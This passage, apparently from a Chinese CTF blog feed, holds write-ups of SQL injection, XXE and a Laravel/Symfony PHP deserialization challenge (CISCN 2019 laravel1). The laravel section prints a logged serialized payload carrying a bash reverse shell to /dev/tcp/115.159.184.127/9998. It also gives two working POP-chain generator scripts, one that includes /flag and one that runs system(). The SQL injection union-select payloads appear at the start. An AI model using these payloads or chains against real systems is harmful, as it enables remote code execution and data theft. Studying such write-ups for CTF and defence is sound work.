class="line">denglu(&apos;0 2nion select * from((select 1)a join (select 2)b join (select 3)c);&apos;+chr(0),6,&apos;2&apos;,&apos;u&apos;)</span><br><span class="line">denglu(&apos;0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);&apos;+chr(0),7,&apos;2&apos;,&apos;u&apos;)</span><br><span class="line">denglu(&quot;0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp &apos;you_want&apos;)b join (select 3)c);&quot;+chr(0),7,&apos;2&apos;,&apos;u&apos;)</span><br><span class="line">denglu(&quot;0 2nion select * from((select 1)a join (select * from you_want)b join (select 3)c);&quot;+chr(0),6,&apos;2&apos;,&apos;u&apos;)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>题型记录</category>
      </categories>
  </entry>
  <entry>
    <title>XXE 题型记录</title>
    <url>/2019/04/22/XXE%E9%A2%98%E5%9E%8B%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="SecurinetsCTF-2019-feedback"><a href="#SecurinetsCTF-2019-feedback" class="headerlink" title="SecurinetsCTF-2019 feedback"></a>SecurinetsCTF-2019 feedback</h2><p>进入页面。<br>然后随便发一点什么东西试一试：<br><img src="https://user-images.githubusercontent.com/40637063/54907627-f3d6d000-4f20-11e9-860d-e967349bb159.png" alt></p>
<p>而且在网页的源代码中可以在<code>&lt;head&gt;</code>中找到以下脚本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">function func()&#123;</span><br><span class="line">    var xml = &apos;&apos; +</span><br><span class="line">        &apos;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&apos; +</span><br><span class="line">        &apos;&lt;feedback&gt;&apos; +</span><br><span class="line">        &apos;&lt;author&gt;&apos; + $(&apos;input[name=&quot;name&quot;]&apos;).val() + &apos;&lt;/author&gt;&apos; +</span><br><span class="line">        &apos;&lt;email&gt;&apos; + $(&apos;input[name=&quot;email&quot;]&apos;).val() + &apos;&lt;/email&gt;&apos; +</span><br><span class="line">        &apos;&lt;content&gt;&apos; + $(&apos;input[name=&quot;feedback&quot;]&apos;).val() + &apos;&lt;/content&gt;&apos; +</span><br><span class="line">        &apos;&lt;/feedback&gt;&apos;;</span><br><span class="line">    var xmlhttp = new XMLHttpRequest();</span><br><span class="line">    xmlhttp.onreadystatechange = function () &#123;</span><br><span class="line">        if(xmlhttp.readyState == 4)&#123;</span><br><span class="line">            console.log(xmlhttp.readyState);</span><br><span class="line">            console.log(xmlhttp.responseText);</span><br><span class="line">            document.getElementById(&apos;Message&apos;).innerHTML = xmlhttp.responseText;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.open(&quot;POST&quot;,&quot;feed.php&quot;,true);</span><br><span class="line">    xmlhttp.send(xml);</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>可以看出来这是个发送<code>xml</code>的脚本。我们将发送的数据抓包，的确是xml。<br>那么考虑<code>xxe</code>。抓包发包如下：</p>
<p><img src="https://user-images.githubusercontent.com/40637063/54907916-ab6be200-4f21-11e9-9471-bff46378d15d.png" alt></p>
<p>解码即可得到flag.<br>切记：任何细微的语法错误(比如忘了分号)都将导致回显失败。</p>
]]></content>
      <categories>
        <category>题型记录</category>
      </categories>
  </entry>
  <entry>
    <title>代码审计 题型记录</title>
    <url>/2019/04/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%E5%9E%8B/</url>
    <content><![CDATA[<h2 id="CISCN-2019-laravel1"><a href="#CISCN-2019-laravel1" class="headerlink" title="CISCN 2019 laravel1"></a>CISCN 2019 laravel1</h2><p>首页代码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//backup in source.tar.gz</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">(\Illuminate\Http\Request $request)</span></span>&#123;</span><br><span class="line">        $payload=$request-&gt;input(<span class="string">"payload"</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($payload))&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            @unserialize($payload);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看样子是把参数payload的值直接反序列化了,那么关键是拥有__destruct魔法方法的类了.</p>
<p>下载源码.源码很大很大,发现了日志文件(最下面)</p>
<p><img src="https://user-images.githubusercontent.com/40637063/66810943-c86e0e00-ef62-11e9-8804-f54dbe78fa59.png" alt="image"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:3:&#123;s:6:&quot;_token&quot;;s:40:&quot;mg8pRdzQ1mQyQuhTbJV3KnfQl9zstzASDGOSzOuE&quot;;s:9:&quot;_previous&quot;;a:1:&#123;s:3:&quot;url&quot;;s:927:&quot;http://localhost/pop_chain/laravel/public/index.php/index?payload=O%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%22%3A2%3A%7Bs%3A57%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%00deferred%22%3Ba%3A1%3A%7Bi%3A1%3BO%3A33%3A%22Symfony%5CComponent%5CCache%5CCacheItem%22%3A3%3A%7Bs%3A12%3A%22%00%2A%00innerItem%22%3Bs%3A45%3A%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F115.159.184.127%2F9998%200%3E%261%22%3Bs%3A11%3A%22%00%2A%00poolHash%22%3Bs%3A1%3A%221%22%3Bs%3A9%3A%22%00%2A%00expiry%22%3Bs%3A1%3A%221%22%3B%7D%7Ds%3A53%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%00pool%22%3BO%3A44%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%22%3A2%3A%7Bs%3A58%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%00setInnerItem%22%3Bs%3A6%3A%22system%22%3Bs%3A54%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%00poolHash%22%3Bs%3A1%3A%221%22%3B%7D%7D&quot;;&#125;s:6:&quot;_flash&quot;;a:2:&#123;s:3:&quot;old&quot;;a:0:&#123;&#125;s:3:&quot;new&quot;;a:0:&#123;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>关键类是<code>TagAwareAdapter</code> ,这段sessoin直接改掉使用的话我打不出来,不过可以根据这个去找相应的pop链条.</p>
<p>TagAwareAdapter.php代码(删除了大部分没有用的代码)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Psr</span>\<span class="title">Cache</span>\<span class="title">CacheItemInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Psr</span>\<span class="title">Cache</span>\<span class="title">InvalidArgumentException</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">PruneableInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">ResettableInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Traits</span>\<span class="title">ContractsTrait</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Traits</span>\<span class="title">ProxyTrait</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Contracts</span>\<span class="title">Cache</span>\<span class="title">TagAwareCacheInterface</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Nicolas Grekas &lt;p<span class="doctag">@tchwork</span>.com&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span> <span class="keyword">implements</span> <span class="title">TagAwareAdapterInterface</span>, <span class="title">TagAwareCacheInterface</span>, <span class="title">PruneableInterface</span>, <span class="title">ResettableInterface</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> TAGS_PREFIX = <span class="string">"\0tags\0"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">use</span> <span class="title">ProxyTrait</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">ContractsTrait</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $deferred = [];</span><br><span class="line">    <span class="keyword">private</span> $createCacheItem;</span><br><span class="line">    <span class="keyword">private</span> $setCacheItemTags;</span><br><span class="line">    <span class="keyword">private</span> $getTagsByKey;</span><br><span class="line">    <span class="keyword">private</span> $invalidateTags;</span><br><span class="line">    <span class="keyword">private</span> $tags;</span><br><span class="line">    <span class="keyword">private</span> $knownTagVersions = [];</span><br><span class="line">    <span class="keyword">private</span> $knownTagVersionsTtl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    __construct构造函数,对题目没有帮助,因此略过</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">invalidateTags</span><span class="params">(array $tags)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ok = <span class="keyword">true</span>;</span><br><span class="line">        $tagsByKey = [];</span><br><span class="line">        $invalidatedTags = [];</span><br><span class="line">        <span class="keyword">foreach</span> ($tags <span class="keyword">as</span> $tag) &#123;</span><br><span class="line">            CacheItem::validateKey($tag);</span><br><span class="line">            $invalidatedTags[$tag] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;deferred) &#123;</span><br><span class="line">            $items = <span class="keyword">$this</span>-&gt;deferred;</span><br><span class="line">            <span class="keyword">foreach</span> ($items <span class="keyword">as</span> $key =&gt; $item) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;pool-&gt;saveDeferred($item)) &#123;</span><br><span class="line">                    <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;deferred[$key]);</span><br><span class="line">                    $ok = <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $f = <span class="keyword">$this</span>-&gt;getTagsByKey;</span><br><span class="line">            $tagsByKey = $f($items);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;deferred = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $tagVersions = <span class="keyword">$this</span>-&gt;getTagVersions($tagsByKey, $invalidatedTags);</span><br><span class="line">        $f = <span class="keyword">$this</span>-&gt;createCacheItem;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($tagsByKey <span class="keyword">as</span> $key =&gt; $tags) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pool-&gt;saveDeferred($f(<span class="keyword">static</span>::TAGS_PREFIX.$key, array_intersect_key($tagVersions, $tags), $items[$key]));</span><br><span class="line">        &#125;</span><br><span class="line">        $ok = <span class="keyword">$this</span>-&gt;pool-&gt;commit() &amp;&amp; $ok;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($invalidatedTags) &#123;</span><br><span class="line">            $f = <span class="keyword">$this</span>-&gt;invalidateTags;</span><br><span class="line">            $ok = $f(<span class="keyword">$this</span>-&gt;tags, $invalidatedTags) &amp;&amp; $ok;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $ok;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">saveDeferred</span><span class="params">(CacheItemInterface $item)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!$item <span class="keyword">instanceof</span> CacheItem) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;deferred[$item-&gt;getKey()] = $item;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">commit</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;invalidateTags([]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;commit();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到<code>$this-&gt;pool-&gt;saveDeferred($item)</code> 这一段是我们可以操控的.在项目中全局搜索含有saveDeferred方法或者__call方法的类.最终经过筛选得到的结果如下:</p>
<p>PhpArrrayAdapter.php(删掉很多无用的东西了):</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Psr</span>\<span class="title">Cache</span>\<span class="title">CacheItemInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Psr</span>\<span class="title">Cache</span>\<span class="title">CacheItemPoolInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Exception</span>\<span class="title">InvalidArgumentException</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">PruneableInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">ResettableInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Traits</span>\<span class="title">ContractsTrait</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Traits</span>\<span class="title">PhpArrayTrait</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Contracts</span>\<span class="title">Cache</span>\<span class="title">CacheInterface</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PhpArrayAdapter</span> <span class="keyword">implements</span> <span class="title">AdapterInterface</span>, <span class="title">CacheInterface</span>, <span class="title">PruneableInterface</span>, <span class="title">ResettableInterface</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">PhpArrayTrait</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">ContractsTrait</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $createCacheItem;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">saveDeferred</span><span class="params">(CacheItemInterface $item)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> === <span class="keyword">$this</span>-&gt;values) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;initialize();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> !<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;keys[$item-&gt;getKey()]) &amp;&amp; <span class="keyword">$this</span>-&gt;pool-&gt;saveDeferred($item);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进initialize方法,发现是从PhpArrayTrait.php 里面来的.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">initialize</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!file_exists(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;keys = <span class="keyword">$this</span>-&gt;values = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $values = (<span class="keyword">include</span> <span class="keyword">$this</span>-&gt;file) ?: [[], []];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">2</span> !== \count($values) || !<span class="keyword">isset</span>($values[<span class="number">0</span>], $values[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;keys = <span class="keyword">$this</span>-&gt;values = [];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="keyword">$this</span>-&gt;keys, <span class="keyword">$this</span>-&gt;values) = $values;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里有文件包含,于是构造payload,</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// https://www.cnblogs.com/wfzWebSecuity/p/11263051.html</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>&#123;</span><br><span class="line">    <span class="title">final</span> <span class="title">class</span> <span class="title">CacheItem</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">// PhpArrrayAdapter.php 中$item的参数必须实现了CacheItemInterface接口,在头部的use项中可以找到use Symfony\Component\Cache\CacheItem;并且发现他实现了这个接口,那么就使用它,没有具体内容.</span><br><span class="line"><span class="comment">// 没有关系的不同的命名空间之间需要用花括号来隔离开来</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line">    <span class="comment">// class ProxyAdapterTest&#123;&#125;</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PhpArrayAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $file;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'/flag'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $deferred = [];</span><br><span class="line">        <span class="keyword">private</span> $pool;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;deferred = <span class="keyword">array</span>(<span class="string">'tr1ple'</span> =&gt; <span class="keyword">new</span> CacheItem());</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pool = <span class="keyword">new</span> PhpArrayAdapter();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">$obj = <span class="keyword">new</span> TagAwareAdapter();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($obj));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>第二种解法:</p>
<p>ProxyAdapter.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Psr</span>\<span class="title">Cache</span>\<span class="title">CacheItemInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Psr</span>\<span class="title">Cache</span>\<span class="title">CacheItemPoolInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">PruneableInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">ResettableInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Traits</span>\<span class="title">ContractsTrait</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Traits</span>\<span class="title">ProxyTrait</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Contracts</span>\<span class="title">Cache</span>\<span class="title">CacheInterface</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Nicolas Grekas &lt;p<span class="doctag">@tchwork</span>.com&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyAdapter</span> <span class="keyword">implements</span> <span class="title">AdapterInterface</span>, <span class="title">CacheInterface</span>, <span class="title">PruneableInterface</span>, <span class="title">ResettableInterface</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">ProxyTrait</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">ContractsTrait</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $namespace;</span><br><span class="line">    <span class="keyword">private</span> $namespaceLen;</span><br><span class="line">    <span class="keyword">private</span> $createCacheItem;</span><br><span class="line">    <span class="keyword">private</span> $setInnerItem;</span><br><span class="line">    <span class="keyword">private</span> $poolHash;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">saveDeferred</span><span class="params">(CacheItemInterface $item)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;doSave($item, <span class="keyword">__FUNCTION__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">doSave</span><span class="params">(CacheItemInterface $item, $method)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!$item <span class="keyword">instanceof</span> CacheItem) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $item = (<span class="keyword">array</span>) $item;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> === $item[<span class="string">"\0*\0expiry"</span>] &amp;&amp; <span class="number">0</span> &lt; $item[<span class="string">"\0*\0defaultLifetime"</span>]) &#123;</span><br><span class="line">            $item[<span class="string">"\0*\0expiry"</span>] = microtime(<span class="keyword">true</span>) + $item[<span class="string">"\0*\0defaultLifetime"</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($item[<span class="string">"\0*\0poolHash"</span>] === <span class="keyword">$this</span>-&gt;poolHash &amp;&amp; $item[<span class="string">"\0*\0innerItem"</span>]) &#123;</span><br><span class="line">            $innerItem = $item[<span class="string">"\0*\0innerItem"</span>];</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">$this</span>-&gt;pool <span class="keyword">instanceof</span> AdapterInterface) &#123;</span><br><span class="line">            <span class="comment">// this is an optimization specific for AdapterInterface implementations</span></span><br><span class="line">            <span class="comment">// so we can save a round-trip to the backend by just creating a new item</span></span><br><span class="line">            $f = <span class="keyword">$this</span>-&gt;createCacheItem;</span><br><span class="line">            $innerItem = $f(<span class="keyword">$this</span>-&gt;namespace.$item[<span class="string">"\0*\0key"</span>], <span class="keyword">null</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $innerItem = <span class="keyword">$this</span>-&gt;pool-&gt;getItem(<span class="keyword">$this</span>-&gt;namespace.$item[<span class="string">"\0*\0key"</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        (<span class="keyword">$this</span>-&gt;setInnerItem)($innerItem, $item);<span class="comment">//这里就是代码执行的地方了</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;pool-&gt;$method($innerItem);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>                                                                                     <span class="comment">// pay attention to the two namespace                                      </span></span><br><span class="line"><span class="comment">// the last namespace was included in the first namespace                  </span></span><br><span class="line"><span class="comment">// that is why we do not need to seperate them                             </span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">CacheItem</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $innerItem = <span class="string">"id"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $poolHash = <span class="string">"tr1ple"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $deferred;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($x)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pool = $x;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;deferred=<span class="keyword">array</span>(<span class="string">"1"</span> =&gt; <span class="keyword">new</span> CacheItem());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyAdapter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $setInnerItem;</span><br><span class="line">    <span class="keyword">private</span> $poolHash;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setInnerItem = <span class="string">"system"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;poolHash = <span class="string">"tr1ple"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> TagAwareAdapter(<span class="keyword">new</span> ProxyAdapter());</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>

<h2 id="jarvisoj-babyphp"><a href="#jarvisoj-babyphp" class="headerlink" title="jarvisoj babyphp"></a>jarvisoj babyphp</h2><p>关键代码</p>
